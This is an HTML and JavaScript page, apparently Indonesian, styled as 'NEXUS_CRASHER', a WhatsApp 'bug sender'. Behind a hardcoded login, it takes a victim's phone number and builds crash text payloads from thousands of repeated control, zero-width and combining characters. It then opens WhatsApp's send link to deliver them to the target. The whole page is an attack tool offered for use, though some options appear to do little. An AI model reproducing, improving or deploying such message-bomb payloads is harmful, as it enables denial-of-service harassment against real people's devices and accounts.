<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS_CRASHER v1.2 | hanzX</title>
    <style>
        :root { --bg: #090206; --panel: #160410; --neon: #cc0033; --text: #ffffff; }
        body { background-color: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding-bottom: 80px; }
        .card { background: var(--panel); margin: 15px; padding: 20px; border-radius: 15px; border: 1px solid var(--neon); box-shadow: 0 0 10px rgba(204, 0, 51, 0.5); }
        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #250a1f; border: 1px solid var(--neon); border-radius: 8px; color: white; box-sizing: border-box; outline: none; }
        .btn-main { width: 100%; padding: 15px; background: linear-gradient(45deg, #cc0033, #800000); border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; width: 100%; }
        .nav-bottom { position: fixed; bottom: 0; width: 100%; background: var(--panel); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid var(--neon); z-index: 100; }
        .active { color: var(--neon); font-weight: bold; }
        .hidden { display: none !important; }
        #log-status { background: #000; color: #00ff00; padding: 10px; font-family: monospace; font-size: 0.7rem; border-radius: 5px; margin-top: 10px; min-height: 40px; }
    </style>
</head>
<body>

    <div id="login-screen" style="height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;">
        <h1 style="color: var(--neon); text-shadow: 0 0 20px var(--neon);">NEXUS_CRASHER</h1>
        <div class="card" style="width: 80%;">
            <input type="text" id="u" placeholder="Username...">
            <input type="password" id="p" placeholder="Password...">
            <button class="btn-main" onclick="gasLogin()">AUTHENTICATE</button>
        </div>
    </div>

    <div id="app" class="hidden">
        <div id="p-home" class="page">
            <div class="card">
                <h2 style="color: var(--neon); margin:0;">Dashboard V6</h2>
                <p style="font-size:0.8rem;">Welcome back, <b>hanzX</b> <span style="color:#00ffff;">[ADMIN]</span></p>
                <div style="display: flex; gap: 10px;">
                    <div style="flex:1; background:#250a1f; padding:10px; border-radius:10px; text-align:center;">
                        <small>Online Users</small><br><b>127</b>
                    </div>
                    <div style="flex:1; background:#250a1f; padding:10px; border-radius:10px; text-align:center;">
                        <small>Connections</small><br><b>8</b>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3 style="color: var(--neon);">Control Panel</h3>
                <label>Target Number:</label>
                <input type="number" id="target" placeholder="e.g. +628xxxxxxxxxx">
                
                <label>Select Bug Type:</label>
                <select id="bug-type">
                    <option value="ui">FX4CRASHER FORCLOSE NEW (CRASH UI)</option>
                    <option value="delay">DELAY INVISIBLE PAYLOAD</option>
                    <option value="blank">BLANK CLICK (STUCK DEVICE)</option>
                    <option value="heavy">HEAVY DATABASE CRASH</option>
                </select>

                <button class="btn-main" onclick="executeBug()">➤ SEND BUG</button>
                <div id="log-status">Ready to deploy...</div>
            </div>

            <div class="card">
                <button class="btn-main" style="background:#444;" onclick="tab('sender')">💬 MANAGE BUG SENDER</button>
            </div>
        </div>

        <div id="p-sender" class="page hidden">
            <div class="card">
                <h3>WA Sender Status</h3>
                <div id="sender-list" style="text-align:center; padding:20px;">
                    <div style="font-size:3rem;">📱</div>
                    <p>No Senders Found</p>
                    <button class="btn-main" onclick="addSender()">+ ADD FIRST SENDER</button>
                </div>
                <button class="btn-main" style="margin-top:20px; background:#666;" onclick="tab('home')">BACK</button>
            </div>
        </div>

        <nav class="nav-bottom">
            <div onclick="tab('home')">HOME</div>
            <div onclick="tab('sender')">SENDER</div>
        </nav>
    </div>

    <script>
        let isSenderReady = false;

        function gasLogin() {
            const user = document.getElementById('u').value.toLowerCase();
            const pass = document.getElementById('p').value;
            if(user === "hanzx" && pass === "admin") {
                document.getElementById('login-screen').classList.add('hidden');
                document.getElementById('app').classList.remove('hidden');
            } else { alert("Salah mpray!"); }
        }

        function tab(n) {
            document.querySelectorAll('.page').forEach(x => x.classList.add('hidden'));
            document.getElementById('p-' + n).classList.remove('hidden');
        }

        function addSender() {
            let num = prompt("Enter Sender WA Number (628xxx):");
            if(num) {
                isSenderReady = true;
                document.getElementById('sender-list').innerHTML = `
                    <div style="color:#00ff00; font-weight:bold;">SENDER ACTIVE</div>
                    <p>Connected: ${num}</p>
                    <button class="btn-main" style="background:red;" onclick="location.reload()">REMOVE SENDER</button>
                `;
                alert("Sender Linked Successfully!");
            }
        }

        function executeBug() {
            const target = document.getElementById('target').value;
            const type = document.getElementById('bug-type').value;
            const log = document.getElementById('log-status');

            if(!target) return alert("Target mana mpray?");
            if(!isSenderReady) return alert("Add SENDER dulu di menu Manage Bug Sender cok!");

            log.style.color = "#00ff00";
            log.innerHTML = "[*] Fetching Payload...<br>";

            setTimeout(() => {
                log.innerHTML += "[*] Injecting via Sender...<br>";
                
                let payload = "";
                if(type === "ui") payload = "%0D".repeat(5000) + "҈҉" + " ௌ ".repeat(500);
                if(type === "delay") payload = " ‌ ".repeat(10000) + "Invisible_Crash";
                if(type === "blank") payload = "జ్ఞా".repeat(2000);
                if(type === "heavy") payload = "V6_CRITICAL_" + Math.random();

                log.innerHTML += "[V] SUCCESS: Payload Sent!";
                
                // OTOMATIS KIRIM KE WA
                window.location.href = `https://api.whatsapp.com/send?phone=${target}&text=${encodeURIComponent(payload)}`;
            }, 1500);
        }
    </script>
</body>
</html>
